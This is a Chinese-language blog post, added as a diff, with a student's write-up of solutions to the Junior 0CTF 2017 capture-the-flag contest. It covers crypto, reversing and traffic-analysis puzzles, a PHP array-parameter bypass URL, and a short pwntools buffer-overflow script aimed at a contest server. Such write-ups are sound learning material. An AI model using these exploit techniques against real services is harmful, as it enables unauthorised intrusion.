@@ -1,0 +1,330 @@
+---
+layout:     post
+title:      "Junior 0CTF 2017"
+subtitle:   " \"SJTU校内赛\""
+date:       2017-12-10
+author:     "Miyunluo"
+header-img: "img/post-bg-0ops.png"
+tags:
+    - CTF
+---
+
+> “flag{php_is_best_language_:P}”
+
+## 前言
+
+SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。
+
+
+## Solved
+
+### 1.QQ Group 50
+
+友情送分题，加入QQ交流群送一个flag。
+
+### 2.Mystery Numbers 100
+
+题目描述没有什么实质性内容。给了一个link[[numbers_f300d7d6dce847a265407e072790370d](https://ctf.0ops.sjtu.cn/attachment/download/signal.txt)]，下载得到一个文本文件，内容如下
+
+```shell
+5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239
+```
+
+看到全是字母+数字，而且范围是0到f，以16进制解码到ascii，得到
+
+```shell
+ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9
+```
+之后很像base64，尝试解码得到flag。
+
+```python
+import base64
+s = 'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'
+a = base64.b64decode(s)
+
+>>flag{d0_y0u_kn0w_b45364_h4h4_6464_y4y4}
+```
+
+### 3.Easy Traffic Analyze 200
+
+题目给了一个link[[flag.pcap](https://ctf.0ops.sjtu.cn/upload/flag.pcap)]，是一个通信包文件，但是用wireshark打开提示格式不正确，于是需要先修复pcap文件，可以使用[[pcapfix](https://f00l.de/pcapfix/)]软件修复。之后使用wireshark打开，过滤http请求，导出http通信包，有三个文件。
+
+![img](/img/in-post/post-blog-j0serv2.png)
+
+其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件头504B 0304。
+
+![img](/img/in-post/post-blog-j0serv4.png)
+
+将不重要的部分删掉，得到文件更改后缀名为zip解压，得到一张图片（还挺好看的 (●ﾟωﾟ●)。
+
+![img](/img/in-post/post-blog-j0serv5.png)
+
+一般套路都是图片里隐写信息，将图片二进制打开，直接去文件尾，得到flag。
+
+![img](/img/in-post/post-blog-j0serv6.png)
+
+### 4.AES-server 100
+
+题目给出“nc 202.121.178.199 9999” 与一个文件[[server.py](https://ctf.0ops.sjtu.cn/attachment/download/server.py)]，文件内容如下，也即是server的代码。
+
+```shell
+#!/usr/bin/env python
+# coding=utf-8
+
+import SocketServer
+from Crypto.Cipher import AES
+
+with open('secretkey', 'rb') as f:
+    key = f.read()
+with open('flag.txt') as f:
+    flag = f.read()
+
+class handler(SocketServer.BaseRequestHandler):
+
+    def handle(self):
+        self.request.send("Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\n")
+        self.request.send("Please input your iv and encrypted message in hex:\n")
+        
+        data = self.request.recv(1024).rstrip()
+        try:
+            raw_data = data.decode('hex')
+        except Exception, e:
+            self.request.send("Error: {}\n".format(e.message))
+            self.request.close()
+            return
+
+        if len(raw_data) < 32 or len(raw_data) & 0xf:
+            self.request.send("Your input is not valid!\n")
+            self.request.close()
+            return
+        
+        iv = raw_data[:16]
+        enc = raw_data[16:]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        plain = cipher.decrypt(enc)
+        self.request.send("Here is your plaintext: {}\n".format(repr(plain)))
+
+        if plain[:5] == 'admin':
+            self.request.send("hello, admin! Here is your flag: {}".format(flag))
+        self.request.close()
+
+
+if __name__ == "__main__":
+    HOST, PORT = "localhost", 9999
+    server = SocketServer.TCPServer((HOST, PORT), handler)
+    server.serve_forever()
+```
+
+代码里显示为CBC模式的解密过程，要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。
+
+这里使用异或算法的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 )。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。
+
+![img](/img/in-post/post-blog-j0serv3.png)
+
+### 5.babyrsa 100
+
+题目提供了一个压缩文件[[babyrsa.zip](https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip)]，包含RAS加密的公钥，密文，现在需要求明文。
+
+首先从publicKey.pem中提取n，e
+
+```python
+from Crypto.PublicKey import RSA
+pub = RSA.importKey(open('./publicKey.pem').read())
+n = long(pub.n)
+e = long(pub.e)
+
+>>n = 39845701744153150941069529194757526450699838667585381414738119544695931460213
+>>e = 65537
+```
+
+这个公钥的问题出来n选择太小，直接暴力破解质因数，这里可以去[[factordb](http://www.factordb.com)]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)
+
+![img](/img/in-post/post-blog-j0serv7.png)
+
+在质因子破p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。
+
+### 6.Shatter Sha512! 150
+
+题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。
+
+![img](/img/in-post/post-blog-j0serv0.png)
+
+题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url
+
+```shell
+202.121.178.201：8083?x[]=1&y[]=2
+```
+
+不等条件显然成立，这里x与y都成为**Array**类型，hash值都为**Null**，于是echo $flag. 
+
+**flag{php_is_best_language_:P}** 被这个漏洞震惊了，果然PHP是最好的语言。
+
+### 7.Penetrate In 150
+
+链接点进去是如下界面
+
+![img](/img/in-post/post-blog-j0serv1.png)
+
+这个题目及其恶心，暂时不表。
+
+### 8.Eva 200
+
+这个题出了bug，直接爆出了答案，没有认真做。
+
+For fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}
+
+### 9.babyre 100
+
+题目给出一个pyc文件[[encrypt.pyc](https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc)]，使用在线工具反编译一下[[decompyle](http://tools.bugscaner.com/decompyle/)]，得到python源文件，内容如下。
+
+```python
+from hashlib import md5
+ 
+def md5raw(s):
+    return bytearray(md5(s).digest())
+ 
+ 
+def xor(a, b):
+    assert len(a) == len(b)
+    return bytearray([ i ^ j for i, j in zip(a, b) ])
+ 
+ 
+flag = bytearray(raw_input('Show me your flag: '))
+assert len(flag) == 32
+for i in range(16):
+    flag[:16] = xor(flag[:16], md5raw(flag[16:]))
+    flag[:16], flag[16:] = flag[16:], flag[:16]
+ 
+if flag == '\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n':
+    print 'Right!'
+else:
+    print 'Wrong!'
+```
+
+这个看代码是典型的Feistel加密，每轮后半部分异或，前后交换，解密就是把过程逆回去。
+
+```python
+from hashlib import md5
+def md5raw(s):
+    return bytearray(md5(s).digest())  
+def xor(a, b):
+    assert len(a) == len(b)
+    return bytearray([ i ^ j for i, j in zip(a, b) ])
+flag = bytearray('\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n')
+
+for i in range(16):
+    flag[16:] = xor(flag[16:], md5raw(flag[:16]))
+    flag[:16], flag[16:] = flag[16:], flag[:16]
+    print(flag)
+
+print(flag)
+
+>>flag{1nt3re5tiNg_F3iste1_ciPh3R}
+```
+
+### 10.encoder 200
+
+逆向题目，链接为[[encoder.zip](https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip)]，解压后一个可执行文件，一个加密后的flag"KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd="。使用IDA打开可执行文件进行分析。
+
+（涉及到IDA，之后添加分析与图）
+
+```python
+def decode(secret):
+    table = 'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'
+    message = [0]*40
+    string = ['']*5
+
+    for i, ch in enumerate(secret):
+        index = table.index(ch)
+        print(index)
+        start = (8-i)*5-5
+        while index!=0:
+            message[start] = index % 2
+            #print (message,start,index)
+            index >>= 1
+            start += 1
+
+    for i in range(5):
+        num = 0
+        for j in range(i*8+7, i*8-1, -1):
+            num <<= 1
+            num += message[j]
+        string[i] = chr(num)
+    print(string)
+    return string[::-1]
+
+print("".join(decode("KNByeN88")+decode("KqslM52E")+decode("1L67aYRE")+decode("K1qQ2N1Q")+decode("ydYlaEd")))
+
+>>flag{d0_U_Kn0w_ba5e32:P}
+```
+
+最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64
+
+### 11.seabreeze's stack 100
+
+题目内容为“nc 202.121.178.181 12321”与一个下载链接[[stack_55a49bdfcdafd0c31657649e905486a4](https://ctf.0ops.sjtu.cn/attachment/download/stack)]，使用IDA打开分析。
+
+（涉及到IDA，之后添加分析与图）
+
+```python
+from zio import *
+from pwn import *
+io = zio(('202.121.178.181', 12321 ))
+io.read_until('Do you want to get acquainted with top experts and like-minded friends in computer security?')  
+io.writeline('Yes!')  
+io.read_until('Do you want to stride forwards on the road of hacking and explore endless possibilities?')  
+io.writeline('Yes!!')
+io.read_until('Do you want to challenge world cutting-edge technology and compete with outstanding hackers?')
+io.writeline('Yes!!!')
+success_addr = 0x080485cb
+payload = 'a' * 0x3fc + "bbbb" + p32(success_addr)
+io.writeline(payload)  
+io.interact()  
+```
+
+## Have Idea
+
+### 12.aes-duet
+
+题目描述为一个链接[[aes_duet.zip](https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip)]，解压得到一个密文和加密函数，文件如下
+
+```python
+from Crypto.Cipher import AES
+def dummy_key_extend(k):
+    assert len(k) == 4
+    return k * 4
+
+def aes_duet(plain, key):
+    # It is so safe that I use AES twice here!
+    assert len(key) == 8
+    k1 = dummy_key_extend(key[:4])
+    k2 = dummy_key_extend(key[4:])
+    c1 = AES.new(k1, AES.MODE_ECB)
+    c2 = AES.new(k2, AES.MODE_ECB)
+    return c2.encrypt(c1.encrypt(plain))
+if __name__ == '__main__':
+    with open('./secretkey', 'rb') as f:
+        key = f.read()
+    # To make life easier...
+    assert (key.encode('hex'))[0] == '0'
+    assert (key.encode('hex'))[-1] == '8'
+    
+    plain = 'I am a piece of lovely plaintext'
+    with open('ciphertext', 'wb') as f:
+        f.write(aes_duet(plain, key))
+    print "I am a lovely flag: flag{ %s}" % key.encode('hex')
+```
+
+思路很简单，就是AES两轮加密的中间相遇攻击，但是计算量有些庞大，虽然题目为了降低复杂性还提示了key的第一位为0最后一位为8，最终因为时间与硬件原因放弃。
+
+## 感想
+
+程序的安全性与正确性同等重要。
+
+我们在众多bug中微妙的生活着。
+
+以及PHP是世界上最好的语言。
+
+![img](/img/in-post/post-blog-j0serv8.gif)
+
+-- miyunluo 于2017.12
